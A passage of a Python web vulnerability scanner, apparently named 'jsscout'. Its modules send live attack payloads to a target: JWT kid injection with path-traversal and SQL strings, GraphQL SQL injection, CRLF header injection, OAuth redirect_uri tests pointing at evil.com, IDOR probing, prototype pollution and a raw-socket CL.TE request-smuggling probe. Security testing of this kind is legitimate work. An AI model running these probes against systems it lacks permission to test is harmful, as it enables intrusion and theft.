                    except Exception:
                        pass

            # 3. kid injection
            if kid:
                kid_payloads = [
                    "../../etc/passwd",
                    "'; SELECT 1--",
                    "/dev/null",
                ]
                for kp in kid_payloads:
                    tampered_hdr = dict(hdr)
                    tampered_hdr["kid"] = kp
                    new_hdr = base64.urlsafe_b64encode(
                        json.dumps(tampered_hdr).encode()
                    ).rstrip(b"=").decode()
                    tampered_token = f"{new_hdr}.{payload}."
                    try:
                        r = self.session.get(
                            url,
                            headers={"Authorization": f"Bearer {tampered_token}"},
                            timeout=self.timeout
                        )
                        if r.status_code == 200:
                            findings.append(_finding(
                                "JWT_KID_INJECTION", "HIGH", url,
                                f"JWT kid parameter injection may be possible: kid={kp}",
                                f"Tampered token accepted (HTTP 200)",
                                "Validate and sanitize JWT kid values. Never use kid in file paths or SQL.",
                                {"kid_payload": kp}
                            ))
                    except Exception:
                        pass

            # 4. Expiry check
            try:
                body = json.loads(base64.urlsafe_b64decode(payload + "=="))
                exp = body.get("exp")
                if exp and exp < time.time():
                    findings.append(_finding(
                        "JWT_EXPIRED_ACCEPTED", "MEDIUM", url,
                        "Server may accept expired JWT tokens",
                        f"Token exp={exp}, current time={int(time.time())}",
                        "Strictly validate JWT exp claim. Reject expired tokens.",
                        {"exp": exp}
                    ))
            except Exception:
                pass

        return findings

    def _is_jwt(self, s: str) -> bool:
        parts = s.split(".")
        return len(parts) == 3 and all(parts[:2]) and parts[0].startswith("eyJ")


# ─────────────────────────────────────────────────────────────────────────────
# 10. GRAPHQL
# ─────────────────────────────────────────────────────────────────────────────

GRAPHQL_ENDPOINTS = [
    "/graphql", "/graphql/", "/api/graphql", "/v1/graphql",
    "/graphiql", "/playground", "/altair", "/api/graphql/v1",
    "/api/v1/graphql", "/graph", "/gql", "/query",
]

INTROSPECTION_QUERY = '{"query":"{__schema{queryType{name}mutationType{name}subscriptionType{name}types{kind name fields{name type{kind name}}}}}"}'


class GraphQLScanner:
    def __init__(self, session: requests.Session, timeout: int = 8, log_fn=None):
        self.session = session
        self.timeout = timeout
        self.log = log_fn or print

    def scan(self, base_url: str) -> list:
        findings = []
        origin = f"{urlparse(base_url).scheme}://{urlparse(base_url).netloc}"

        for ep in GRAPHQL_ENDPOINTS:
            url = origin + ep
            try:
                # 1. Introspection
                r = self.session.post(
                    url,
                    json=json.loads(INTROSPECTION_QUERY),
                    headers={"Content-Type": "application/json"},
                    timeout=self.timeout
                )
                if r.status_code == 200 and "__schema" in r.text:
                    findings.append(_finding(
                        "GRAPHQL_INTROSPECTION", "HIGH", url,
                        "GraphQL introspection enabled — full schema exposed",
                        f"Response contains __schema at {ep}",
                        "Disable introspection in production. Restrict GraphQL schema exposure.",
                        {"endpoint": url}
                    ))

                    # 2. Try batch query abuse
                    batch = '[{"query":"{__typename}"},{"query":"{__typename}"},{"query":"{__typename}"},{"query":"{__typename}"},{"query":"{__typename}"}]'
                    rb = self.session.post(
                        url, data=batch,
                        headers={"Content-Type": "application/json"},
                        timeout=self.timeout
                    )
                    if rb.status_code == 200 and "__typename" in rb.text:
                        findings.append(_finding(
                            "GRAPHQL_BATCHING", "MEDIUM", url,
                            "GraphQL batch queries allowed — can amplify requests",
                            "Batch of 5 identical queries accepted",
                            "Limit query depth and disable batching or implement rate limiting per query.",
                            {"endpoint": url}
                        ))

                # 3. SQL injection via GraphQL
                sqli_query = '{"query":"{ user(id: \\"1 OR 1=1\\") { id name email } }"}'
                rs = self.session.post(
                    url, data=sqli_query,
                    headers={"Content-Type": "application/json"},
                    timeout=self.timeout
                )
                for pat in SQLI_ERROR_PATTERNS[:5]:
                    if pat.search(rs.text):
                        findings.append(_finding(
                            "GRAPHQL_SQLI", "CRITICAL", url,
                            "SQL injection in GraphQL resolver",
                            f"SQL error pattern detected in GraphQL response",
                            "Use parameterized queries in all GraphQL resolvers.",
                            {"endpoint": url}
                        ))
                        break

            except Exception:
                pass

        return findings


# ─────────────────────────────────────────────────────────────────────────────
# 11. SUBDOMAIN TAKEOVER
# ─────────────────────────────────────────────────────────────────────────────

TAKEOVER_FINGERPRINTS = {
    "GitHub Pages":       ["There isn't a GitHub Pages site here", "github.com"],
    "Heroku":             ["No such app", "herokucdn.com"],
    "Netlify":            ["Not found - Request ID:", "netlify.com"],
    "Surge.sh":           ["project not found", "surge.sh"],
    "AWS S3":             ["NoSuchBucket", "s3.amazonaws.com"],
    "Azure":              ["ErrorCode: BlobNotFound", "azurewebsites.net", "blob.core.windows.net"],
    "Fastly":             ["Fastly error: unknown domain", "fastly.net"],
    "Shopify":            ["Sorry, this shop is currently unavailable", "myshopify.com"],
    "Zendesk":            ["Help Center Closed", "zendesk.com"],
    "Unbounce":           ["The requested URL was not found", "unbounce.com"],
    "Tumblr":             ["There's nothing here", "tumblr.com"],
    "WordPress.com":      ["Do you want to register", "wordpress.com"],
    "ReadTheDocs":        ["unknown to Read the Docs", "readthedocs.io"],
    "Ghost":              ["The thing you were looking for is no longer here", "ghost.io"],
    "Fly.io":             ["404 Not Found", "fly.dev"],
}


class SubdomainTakeoverScanner:
    def __init__(self, session: requests.Session, timeout: int = 6, log_fn=None):
        self.session = session
        self.timeout = timeout
        self.log = log_fn or print

    def scan(self, base_url: str, extra_subdomains: list = None) -> list:
        findings = []
        domain = urlparse(base_url).netloc.split(":")[0]

        subdomains_to_check = list(extra_subdomains or [])
        # Add common subdomains
        common = ["www", "mail", "dev", "staging", "test", "api", "app",
                  "admin", "blog", "docs", "cdn", "assets", "static",
                  "beta", "demo", "old", "portal", "status", "support"]
        for sub in common:
            subdomains_to_check.append(f"{sub}.{domain}")

        for sub in subdomains_to_check[:30]:
            try:
                try:
                    cname = socket.getfqdn(sub)
                except Exception:
                    cname = sub

                r = self.session.get(
                    f"https://{sub}", timeout=self.timeout,
                    allow_redirects=True
                )
                body = r.text[:3000]

                for service, patterns in TAKEOVER_FINGERPRINTS.items():
                    if any(p.lower() in body.lower() for p in patterns[:-1]):
                        if any(patterns[-1] in cname for p in patterns):
                            findings.append(_finding(
                                "SUBDOMAIN_TAKEOVER", "CRITICAL",
                                f"https://{sub}",
                                f"Subdomain takeover possible! {sub} → {service}",
                                f"CNAME: {cname} | Fingerprint: {patterns[0][:60]}",
                                f"Remove the dangling DNS record for {sub} or reclaim the {service} resource.",
                                {"subdomain": sub, "service": service, "cname": cname}
                            ))
                            break
                        # Check body fingerprint even without CNAME match
                        for fp in patterns[:-1]:
                            if fp.lower() in body.lower():
                                findings.append(_finding(
                                    "SUBDOMAIN_TAKEOVER_CANDIDATE", "HIGH",
                                    f"https://{sub}",
                                    f"Possible subdomain takeover: {sub} may be claimable on {service}",
                                    f"Response contains: {fp[:80]}",
                                    f"Verify and reclaim the {service} resource or remove DNS record.",
                                    {"subdomain": sub, "service": service}
                                ))
                                break

            except requests.ConnectionError:
                # NXDOMAIN or connection refused — check for dangling CNAME
                try:
                    cname = socket.getfqdn(sub)
                    if cname != sub:
                        findings.append(_finding(
                            "DANGLING_CNAME", "MEDIUM",
                            f"https://{sub}",
                            f"Dangling CNAME: {sub} → {cname} (not resolving)",
                            f"CNAME exists but target is unreachable",
                            "Remove or update the dangling CNAME record.",
                            {"subdomain": sub, "cname": cname}
                        ))
                except Exception:
                    pass
            except Exception:
                pass

        return findings


# ─────────────────────────────────────────────────────────────────────────────
# 12. SECURITY HEADERS AUDIT
# ─────────────────────────────────────────────────────────────────────────────

SECURITY_HEADERS = {
    "Strict-Transport-Security": {
        "missing_sev":  "HIGH",
        "missing_desc": "Missing HSTS — site can be downgraded to HTTP",
        "fix": "Add: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload",
    },
    "Content-Security-Policy": {
        "missing_sev":  "HIGH",
        "missing_desc": "Missing CSP — XSS and injection attacks are not mitigated",
        "fix": "Define a strict Content-Security-Policy. Start with default-src 'self'.",
    },
    "X-Frame-Options": {
        "missing_sev":  "MEDIUM",
        "missing_desc": "Missing X-Frame-Options — page can be embedded in iframes (clickjacking)",
        "fix": "Add: X-Frame-Options: DENY or SAMEORIGIN. Prefer CSP frame-ancestors.",
    },
    "X-Content-Type-Options": {
        "missing_sev":  "MEDIUM",
        "missing_desc": "Missing X-Content-Type-Options — MIME sniffing attacks possible",
        "fix": "Add: X-Content-Type-Options: nosniff",
    },
    "Referrer-Policy": {
        "missing_sev":  "LOW",
        "missing_desc": "Missing Referrer-Policy — referrer leakage possible",
        "fix": "Add: Referrer-Policy: strict-origin-when-cross-origin",
    },
    "Permissions-Policy": {
        "missing_sev":  "LOW",
        "missing_desc": "Missing Permissions-Policy — browser features unrestricted",
        "fix": "Add: Permissions-Policy: camera=(), microphone=(), geolocation=()",
    },
    "X-XSS-Protection": {
        "missing_sev":  "INFO",
        "missing_desc": "X-XSS-Protection header absent (legacy but still useful for old browsers)",
        "fix": "Add: X-XSS-Protection: 1; mode=block",
    },
}

CSP_WEAKNESSES = [
    ("unsafe-inline",   "HIGH",    "CSP contains 'unsafe-inline' — inline XSS not blocked"),
    ("unsafe-eval",     "HIGH",    "CSP contains 'unsafe-eval' — eval-based XSS not blocked"),
    ("*",               "HIGH",    "CSP contains wildcard '*' — source restriction ineffective"),
    ("data:",           "MEDIUM",  "CSP allows data: URIs — potential XSS vector"),
    ("http:",           "MEDIUM",  "CSP allows http: URIs — mixed content and XSS risk"),
]


class SecurityHeadersAuditor:
    def __init__(self, session: requests.Session, timeout: int = 8, log_fn=None):
        self.session = session
        self.timeout = timeout
        self.log = log_fn or print

    def scan(self, url: str) -> list:
        findings = []
        try:
            r = self.session.get(url, timeout=self.timeout)
            hdrs = {k.lower(): v for k, v in r.headers.items()}

            for header, cfg in SECURITY_HEADERS.items():
                if header.lower() not in hdrs:
                    findings.append(_finding(
                        "MISSING_SECURITY_HEADER", cfg["missing_sev"], url,
                        cfg["missing_desc"],
                        f"Header '{header}' absent from response",
                        cfg["fix"],
                        {"header": header}
                    ))

            # Inspect CSP for weaknesses
            csp = hdrs.get("content-security-policy", "")
            if csp:
                for keyword, sev, desc in CSP_WEAKNESSES:
                    if keyword in csp:
                        findings.append(_finding(
                            "WEAK_CSP", sev, url, desc,
                            f"CSP value: {csp[:200]}",
                            "Tighten CSP. Remove unsafe-inline/eval. Use nonces.",
                            {"keyword": keyword}
                        ))

            # HSTS strength check
            hsts = hdrs.get("strict-transport-security", "")
            if hsts:
                m = re.search(r"max-age=(\d+)", hsts)
                if m and int(m.group(1)) < 15768000:
                    findings.append(_finding(
                        "WEAK_HSTS", "MEDIUM", url,
                        "HSTS max-age too low (< 6 months)",
                        f"max-age={m.group(1)}",
                        "Set max-age=31536000 (1 year) minimum. Add includeSubDomains; preload.",
                        {"max_age": int(m.group(1))}
                    ))

            # Server version disclosure
            server = r.headers.get("Server", "")
            x_powered = r.headers.get("X-Powered-By", "")
            if re.search(r"\d+\.\d+", server):
                findings.append(_finding(
                    "SERVER_VERSION_DISCLOSURE", "LOW", url,
                    f"Server header discloses version: {server}",
                    f"Server: {server}",
                    "Remove or genericise the Server header.",
                    {"server": server}
                ))
            if x_powered:
                findings.append(_finding(
                    "XPOWEREDBY_DISCLOSURE", "LOW", url,
                    f"X-Powered-By discloses technology: {x_powered}",
                    f"X-Powered-By: {x_powered}",
                    "Remove X-Powered-By header.",
                    {"x_powered_by": x_powered}
                ))

        except Exception:
            pass
        return findings


# ─────────────────────────────────────────────────────────────────────────────
# 13. COOKIE SECURITY AUDIT
# ─────────────────────────────────────────────────────────────────────────────

class CookieAuditor:
    def __init__(self, session: requests.Session, timeout: int = 8, log_fn=None):
        self.session = session
        self.timeout = timeout
        self.log = log_fn or print

    def scan(self, url: str) -> list:
        findings = []
        try:
            r = self.session.get(url, timeout=self.timeout)
            raw_cookies = r.headers.get("Set-Cookie", "")
            all_set_cookie = r.raw.headers.getlist("Set-Cookie") if hasattr(r.raw.headers, "getlist") else []
            if raw_cookies and not all_set_cookie:
                all_set_cookie = [raw_cookies]

            for cookie_str in all_set_cookie:
                cl = cookie_str.lower()
                name = cookie_str.split("=")[0].strip()

                # Detect session/auth cookie names
                is_sensitive = any(kw in name.lower() for kw in
                                   ["session", "sess", "auth", "token", "jwt", "id", "user", "login"])

                if "httponly" not in cl:
                    findings.append(_finding(
                        "COOKIE_NO_HTTPONLY", "MEDIUM" if is_sensitive else "LOW", url,
                        f"Cookie '{name}' missing HttpOnly flag — accessible via JavaScript",
                        f"Set-Cookie: {cookie_str[:100]}",
                        "Add HttpOnly flag to prevent JS access to cookies.",
                        {"cookie_name": name}
                    ))

                if "secure" not in cl and url.startswith("https"):
                    findings.append(_finding(
                        "COOKIE_NO_SECURE", "MEDIUM" if is_sensitive else "LOW", url,
                        f"Cookie '{name}' missing Secure flag — sent over HTTP",
                        f"Set-Cookie: {cookie_str[:100]}",
                        "Add Secure flag to prevent cookie transmission over HTTP.",
                        {"cookie_name": name}
                    ))

                if "samesite" not in cl:
                    findings.append(_finding(
                        "COOKIE_NO_SAMESITE", "MEDIUM" if is_sensitive else "LOW", url,
                        f"Cookie '{name}' missing SameSite attribute — CSRF risk",
                        f"Set-Cookie: {cookie_str[:100]}",
                        "Add SameSite=Strict or SameSite=Lax to mitigate CSRF.",
                        {"cookie_name": name}
                    ))
                elif "samesite=none" in cl and "secure" not in cl:
                    findings.append(_finding(
                        "COOKIE_SAMESITE_NONE_INSECURE", "HIGH", url,
                        f"Cookie '{name}' has SameSite=None without Secure — CSRF possible",
                        f"Set-Cookie: {cookie_str[:100]}",
                        "SameSite=None requires Secure flag.",
                        {"cookie_name": name}
                    ))

        except Exception:
            pass
        return findings


# ─────────────────────────────────────────────────────────────────────────────
# 14. INFORMATION DISCLOSURE
# ─────────────────────────────────────────────────────────────────────────────

INFO_DISCLOSURE_PATTERNS = [
    (re.compile(r"(?:Exception|Traceback|at [a-z]+\.[A-Z][a-z]+\.[a-z]+\()", re.I),
     "STACK_TRACE", "HIGH", "Stack trace leaked in response"),
    (re.compile(r"(?:mysql|postgresql|oracle|sqlite|mssql).*error", re.I),
     "DB_ERROR", "HIGH", "Database error message leaked"),
    (re.compile(r"(?:root):\*:0:0", re.I),
     "ETC_PASSWD", "CRITICAL", "/etc/passwd content leaked"),
    (re.compile(r"(?:PHP Parse error|PHP Fatal error|PHP Warning|PHP Notice)", re.I),
     "PHP_ERROR", "MEDIUM", "PHP error message leaked"),
    (re.compile(r"SyntaxError|ReferenceError|TypeError.*at.*\d+:\d+"),
     "JS_ERROR", "LOW", "JavaScript error with stack trace leaked"),
    (re.compile(r"(?:DEBUG|DEVELOPMENT)\s*=\s*True", re.I),
     "DEBUG_MODE", "HIGH", "Debug mode enabled in response"),
    (re.compile(r"BEGIN (RSA )?PRIVATE KEY"),
     "PRIVATE_KEY", "CRITICAL", "Private key exposed in response"),
    (re.compile(r"(?:AKIA|ASIA)[A-Z0-9]{16}"),
     "AWS_KEY", "CRITICAL", "AWS access key exposed in response"),
    (re.compile(r'"password"\s*:\s*"[^"]+"', re.I),
     "PASSWORD_IN_JSON", "CRITICAL", "Password exposed in JSON response"),
    (re.compile(r"(?:internal server error|application error|unhandled exception)", re.I),
     "GENERIC_ERROR", "MEDIUM", "Generic application error message exposed"),
]

ERROR_TRIGGER_PATHS = [
    "/%00", "/<script>", "/';DROP TABLE", "/../../etc/passwd",
    "/?id=1'", "/?q=<test>", "/undefined", "/null",
]


class InfoDisclosureScanner:
    def __init__(self, session: requests.Session, timeout: int = 8, log_fn=None):
        self.session = session
        self.timeout = timeout
        self.log = log_fn or print

    def scan(self, base_url: str, visited_urls: list = None) -> list:
        findings = []
        origin = f"{urlparse(base_url).scheme}://{urlparse(base_url).netloc}"

        urls_to_check = list(set([base_url] + (visited_urls or [])[:20]))
        # Add error-triggering paths
        for path in ERROR_TRIGGER_PATHS:
            urls_to_check.append(origin + path)

        for url in urls_to_check[:30]:
            try:
                r = self.session.get(url, timeout=self.timeout)
                body = r.text[:5000]
                for pat, vuln_type, sev, desc in INFO_DISCLOSURE_PATTERNS:
                    m = pat.search(body)
                    if m:
                        findings.append(_finding(
                            vuln_type, sev, url,
                            desc,
                            f"Match: {m.group(0)[:200]}",
                            "Suppress verbose error messages in production. Log errors server-side only.",
                            {"pattern": pat.pattern[:60]}
                        ))
            except Exception:
                pass

        return findings


# ─────────────────────────────────────────────────────────────────────────────
# 15. CRLF / HEADER INJECTION
# ─────────────────────────────────────────────────────────────────────────────

CRLF_PAYLOADS = [
    "%0d%0aX-Injected: jsscout-crlf",
    "%0aX-Injected:jsscout-crlf",
    "\r\nX-Injected: jsscout-crlf",
    "%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0a",
    "%0d%0aSet-Cookie:jsscout=crlf",
    "\r\nSet-Cookie:jsscout=crlf",
    "%E5%98%8A%E5%98%8DX-Injected:jsscout",   # Unicode CRLF bypass
]

CRLF_PARAMS = ["url", "redirect", "next", "return", "path", "callback",
               "ref", "location", "lang", "l", "search", "q"]


class CRLFScanner:
    def __init__(self, session: requests.Session, timeout: int = 8, log_fn=None):
        self.session = session
        self.timeout = timeout
        self.log = log_fn or print

    def scan(self, url: str, params: list) -> list:
        findings = []
        all_params = list(dict.fromkeys((params or []) + CRLF_PARAMS))[:20]

        for param in all_params:
            for payload in CRLF_PAYLOADS[:4]:
                try:
                    test_url = f"{url}?{urlencode({param: payload})}"
                    r = self.session.get(test_url, timeout=self.timeout,
                                         allow_redirects=False)
                    # Check if our injected header appears in response
                    if "X-Injected" in r.headers or "jsscout" in str(r.headers).lower():
                        findings.append(_finding(
                            "CRLF_INJECTION", "HIGH", test_url,
                            f"CRLF / Header injection via parameter '{param}'",
                            f"Injected header found in response: {dict(r.headers)}",
                            "Validate and strip CR/LF from all user input used in HTTP headers.",
                            {"param": param, "payload": payload}
                        ))
                        break
                    # Check Location header for injection (redirect-based)
                    loc = r.headers.get("Location", "")
                    if "\n" in loc or "\r" in loc or "X-Injected" in loc:
                        findings.append(_finding(
                            "CRLF_IN_REDIRECT", "HIGH", test_url,
                            f"CRLF in redirect Location header via parameter '{param}'",
                            f"Location: {loc[:100]}",
                            "Strip CRLF from all redirect targets.",
                            {"param": param, "payload": payload}
                        ))
                        break
                except Exception:
                    pass
        return findings


# ─────────────────────────────────────────────────────────────────────────────
# 16. OAuth / OIDC MISCONFIGS
# ─────────────────────────────────────────────────────────────────────────────

class OAuthScanner:
    def __init__(self, session: requests.Session, timeout: int = 8, log_fn=None):
        self.session = session
        self.timeout = timeout
        self.log = log_fn or print

    def scan(self, base_url: str, endpoints: list = None) -> list:
        findings = []
        origin = f"{urlparse(base_url).scheme}://{urlparse(base_url).netloc}"

        # Find OAuth endpoints
        oauth_paths = [
            "/oauth/authorize", "/oauth2/authorize", "/auth/oauth",
            "/connect/authorize", "/oauth/token", "/oauth2/token",
            "/auth/token", "/.well-known/openid-configuration",
            "/oauth/.well-known/openid-configuration",
        ]

        discovered_oauth = []
        for path in oauth_paths:
            try:
                r = self.session.get(origin + path, timeout=4,
                                     allow_redirects=False)
                if r.status_code in (200, 302, 400, 401):
                    discovered_oauth.append(origin + path)
            except Exception:
                pass

        for ep in list(set(discovered_oauth + (endpoints or [])))[:10]:
            # 1. Open redirect_uri
            evil_uris = [
                "https://evil.com",
                "https://evil.com/callback",
                "//evil.com",
                "https://trusted.com.evil.com",
                ep + "?redirect_uri=https://evil.com",
            ]
            for evil_uri in evil_uris[:3]:
                try:
                    test_url = f"{ep}?response_type=code&client_id=test&redirect_uri={quote(evil_uri)}&scope=openid"
                    r = self.session.get(test_url, timeout=self.timeout,
                                         allow_redirects=False)
                    loc = r.headers.get("Location", "")
                    if "evil.com" in loc:
                        findings.append(_finding(
                            "OAUTH_OPEN_REDIRECT_URI", "CRITICAL", test_url,
                            "OAuth redirect_uri validation bypass — token theft possible",
                            f"redirect_uri={evil_uri} accepted, Location: {loc[:100]}",
                            "Strictly validate redirect_uri against a registered allowlist.",
                            {"endpoint": ep, "evil_uri": evil_uri}
                        ))
                        break
                except Exception:
                    pass

            # 2. Missing state parameter (CSRF)
            try:
                test_url = f"{ep}?response_type=code&client_id=test&redirect_uri={quote(base_url)}&scope=openid"
                r = self.session.get(test_url, timeout=self.timeout,
                                     allow_redirects=False)
                loc = r.headers.get("Location", "")
                if "code=" in loc and "state=" not in loc and "error" not in loc.lower():
                    findings.append(_finding(
                        "OAUTH_MISSING_STATE", "HIGH", test_url,
                        "OAuth flow missing state parameter — CSRF attack possible",
                        "Authorization code issued without state parameter",
                        "Always require and validate state parameter. Use PKCE for public clients.",
                        {"endpoint": ep}
                    ))
            except Exception:
                pass

        return findings


# ─────────────────────────────────────────────────────────────────────────────
# 17. IDOR (Insecure Direct Object Reference)
# ─────────────────────────────────────────────────────────────────────────────

IDOR_PARAMS = ["id", "user_id", "userId", "account", "account_id",
               "order", "order_id", "doc", "document_id", "file_id",
               "profile_id", "uid", "pid", "rid", "item_id", "msg_id"]


class IDORScanner:
    def __init__(self, session: requests.Session, timeout: int = 8, log_fn=None):
        self.session = session
        self.timeout = timeout
        self.log = log_fn or print

    def scan(self, url: str, params: list) -> list:
        findings = []
        all_params = list(dict.fromkeys(
            [p for p in (params or []) if p in IDOR_PARAMS] + IDOR_PARAMS
        ))[:15]

        for param in all_params:
            try:
                # First get baseline with id=1
                r1 = self.session.get(f"{url}?{urlencode({param: '1'})}", timeout=self.timeout)
                if r1.status_code != 200 or len(r1.text) < 50:
                    continue

                # Try id=2
                r2 = self.session.get(f"{url}?{urlencode({param: '2'})}", timeout=self.timeout)
                # Try id=0
                r0 = self.session.get(f"{url}?{urlencode({param: '0'})}", timeout=self.timeout)

                if r1.status_code == 200 and r2.status_code == 200:
                    # Different content for different IDs — potential IDOR
                    if abs(len(r1.text) - len(r2.text)) > 20:
                        # Check if it contains user data indicators
                        sensitive_markers = ["email", "phone", "address", "ssn",
                                             "credit", "password", "token", "private"]
                        for marker in sensitive_markers:
                            if marker in r1.text.lower() or marker in r2.text.lower():
                                findings.append(_finding(
                                    "IDOR_CANDIDATE", "HIGH",
                                    f"{url}?{urlencode({param: '1'})}",
                                    f"Potential IDOR via parameter '{param}' — different records accessible",
                                    f"id=1 ({len(r1.text)}B) vs id=2 ({len(r2.text)}B), contains sensitive field '{marker}'",
                                    "Implement object-level authorization. Verify requesting user owns the resource.",
                                    {"param": param, "marker": marker}
                                ))
                                break

            except Exception:
                pass

        return findings


# ─────────────────────────────────────────────────────────────────────────────
# 18. PROTOTYPE POLLUTION (parameter probe)
# ─────────────────────────────────────────────────────────────────────────────

PROTO_PARAMS = [
    "__proto__[polluted]", "__proto__.polluted",
    "constructor[prototype][polluted]",
    "constructor.prototype.polluted",
    "__proto__[isAdmin]", "constructor[prototype][isAdmin]",
]

PROTO_INDICATORS = ["polluted", "isAdmin", "prototype", "__proto__"]


class ProtoPollutionScanner:
    def __init__(self, session: requests.Session, timeout: int = 8, log_fn=None):
        self.session = session
        self.timeout = timeout
        self.log = log_fn or print

    def scan(self, url: str) -> list:
        findings = []
        try:
            for param in PROTO_PARAMS[:4]:
                test_url = f"{url}?{param}=jsscout_pp_test"
                r = self.session.get(test_url, timeout=self.timeout)
                if "jsscout_pp_test" in r.text:
                    findings.append(_finding(
                        "PROTOTYPE_POLLUTION_SERVER", "HIGH", test_url,
                        "Server-side prototype pollution — injected property reflected in response",
                        f"Param: {param}=jsscout_pp_test found in response",
                        "Sanitize and block __proto__ / constructor keys in all JSON/query parsers.",
                        {"param": param}
                    ))
                    break
        except Exception:
            pass
        return findings


# ─────────────────────────────────────────────────────────────────────────────
# 19. HTTP REQUEST SMUGGLING PROBE
# ─────────────────────────────────────────────────────────────────────────────

class SmuggleProber:
    """
    Lightweight probe for CL.TE / TE.CL desync.
    Sends a request with both Content-Length and Transfer-Encoding headers.
    Timing and response difference detection.
    """
    def __init__(self, session: requests.Session, timeout: int = 10, log_fn=None):
        self.session = session
        self.timeout = timeout
        self.log = log_fn or print

    def scan(self, base_url: str) -> list:
        findings = []
        parsed = urlparse(base_url)
        host = parsed.netloc
        scheme = parsed.scheme

        # We'll use raw sockets for smuggling probes
        # Probe 1: CL.TE  — front-end uses CL, back-end uses TE
        try:
            import ssl as _ssl

            def raw_request(payload_bytes: bytes) -> bytes:
                port = 443 if scheme == "https" else 80
                if ":" in host:
                    h, p = host.rsplit(":", 1)
                    port = int(p)
                else:
                    h = host

                sock = socket.create_connection((h, port), timeout=self.timeout)
                if scheme == "https":
                    ctx = _ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = _ssl.CERT_NONE
                    sock = ctx.wrap_socket(sock, server_hostname=h)

                sock.sendall(payload_bytes)
                resp = b""
                sock.settimeout(4)
                try:
                    while True:
                        chunk = sock.recv(4096)
                        if not chunk:
                            break
                        resp += chunk
                except Exception:
                    pass
                sock.close()
                return resp

            # CL.TE probe — if back-end sees "G" as start of next request
            clte = (
                f"POST / HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: 6\r\n"
                f"Transfer-Encoding: chunked\r\n"
                f"\r\n"
                f"0\r\n"
                f"\r\n"
                f"G"
            ).encode()

            t0 = time.time()
            resp = raw_request(clte)
            elapsed = time.time() - t0

            if b"HTTP/1.1 40" in resp[:20] or b"HTTP/1.1 20" in resp[:20]:
                if elapsed > 4:
                    findings.append(_finding(
                        "HTTP_SMUGGLING_CLTE", "HIGH", base_url,
                        "Possible CL.TE HTTP request smuggling (timing response)",
                        f"Double-header POST responded in {elapsed:.1f}s",
                        "Configure consistent HTTP parsing across reverse proxy and origin. Disable TE on front-end.",
                        {"elapsed": elapsed, "technique": "CL.TE"}
                    ))

        except Exception:
            pass

        return findings


# ─────────────────────────────────────────────────────────────────────────────
# 20. CLICKJACKING
# ─────────────────────────────────────────────────────────────────────────────

class ClickjackScanner:
    def __init__(self, session: requests.Session, timeout: int = 8, log_fn=None):
        self.session = session
        self.timeout = timeout
        self.log = log_fn or print

    def scan(self, url: str) -> list:
        findings = []
        try:
            r = self.session.get(url, timeout=self.timeout)
            xfo = r.headers.get("X-Frame-Options", "").lower()
            csp = r.headers.get("Content-Security-Policy", "").lower()

            # frame-ancestors in CSP overrides X-Frame-Options
            has_frame_ancestors = "frame-ancestors" in csp
            has_xfo = xfo in ("deny", "sameorigin")

            if not has_frame_ancestors and not has_xfo:
                findings.append(_finding(
                    "CLICKJACKING", "MEDIUM", url,
                    "Page is embeddable in iframes — clickjacking possible",
                    f"X-Frame-Options: {xfo or '(absent)'} | CSP frame-ancestors: (absent)",
                    "Add X-Frame-Options: DENY or CSP frame-ancestors 'self'.",
                    {"x_frame_options": xfo or "absent"}
                ))
        except Exception:
            pass
        return findings


# ─────────────────────────────────────────────────────────────────────────────
# MASTER ORCHESTRATOR
# ─────────────────────────────────────────────────────────────────────────────

class AdvancedScanner:
    """
    Orchestrates all advanced vulnerability checks.
    Call run() to execute everything in parallel with timeouts.
    """

    CATEGORY_TIMEOUT = {
        "waf_origin":        30,
        "sqli":              90,
        "ssti":              60,
        "ssrf":              60,
        "xxe":               30,
        "cmdi":              60,
        "traversal":         30,
        "deserial":          20,
        "jwt":               20,
        "graphql":           30,
        "subdomain":         60,
        "sec_headers":       15,
        "cookies":           15,
        "info_disclosure":   30,
        "crlf":              30,
        "oauth":             30,
        "idor":              60,
        "proto_pollution":   15,
        "smuggling":         20,
        "clickjack":         10,
    }

    def __init__(self, target_url: str,
                 session: requests.Session = None,
                 threads: int = 10,
                 timeout: int = 10,
                 log_fn=None):

        if "://" not in target_url:
            target_url = "https://" + target_url
        self.target_url  = target_url
        self.base_domain = urlparse(target_url).netloc
        self.threads     = threads
        self.timeout     = timeout
        self.log         = log_fn or print

        self.session = session or requests.Session()
        self.session.verify = False
        self.session.headers.setdefault(
            "User-Agent",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124 Safari/537.36"
        )

        self.findings: dict = {cat: [] for cat in self.CATEGORY_TIMEOUT}
        self._lock = threading.Lock()

    def run(self, param_map: dict = None, visited_urls: list = None,
            xml_endpoints: list = None, jwt_tokens: list = None,
            extra_subdomains: list = None) -> dict:
        """
        Run all checks. Returns dict of category → [findings].
        """
        # Gather a flat param list from param_map
        all_params = list(dict.fromkeys(
            p for params in (param_map or {}).values() for p in params
        ))

        url = self.target_url
        tasks = {
            "waf_origin":      lambda: WAFOriginScanner(self.session, self.timeout, self.log).scan(url),
            "sqli":            lambda: SQLiScanner(self.session, self.timeout, self.log).scan(url, all_params),
            "ssti":            lambda: SSTIScanner(self.session, self.timeout, self.log).scan(url, all_params),
            "ssrf":            lambda: SSRFScanner(self.session, self.timeout, self.log).scan(url, all_params),
            "xxe":             lambda: XXEScanner(self.session, self.timeout, self.log).scan(url, xml_endpoints),
            "cmdi":            lambda: CMDInjScanner(self.session, self.timeout, self.log).scan(url, all_params),
            "traversal":       lambda: PathTraversalScanner(self.session, self.timeout, self.log).scan(url, all_params),
            "deserial":        lambda: DeserialScanner(self.session, self.timeout, self.log).scan(url, all_params),
            "jwt":             lambda: JWTScanner(self.session, self.timeout, self.log).scan(url, jwt_tokens),
            "graphql":         lambda: GraphQLScanner(self.session, self.timeout, self.log).scan(url),
            "subdomain":       lambda: SubdomainTakeoverScanner(self.session, self.timeout, self.log).scan(url, extra_subdomains),
            "sec_headers":     lambda: SecurityHeadersAuditor(self.session, self.timeout, self.log).scan(url),
            "cookies":         lambda: CookieAuditor(self.session, self.timeout, self.log).scan(url),
            "info_disclosure": lambda: InfoDisclosureScanner(self.session, self.timeout, self.log).scan(url, visited_urls),
            "crlf":            lambda: CRLFScanner(self.session, self.timeout, self.log).scan(url, all_params),
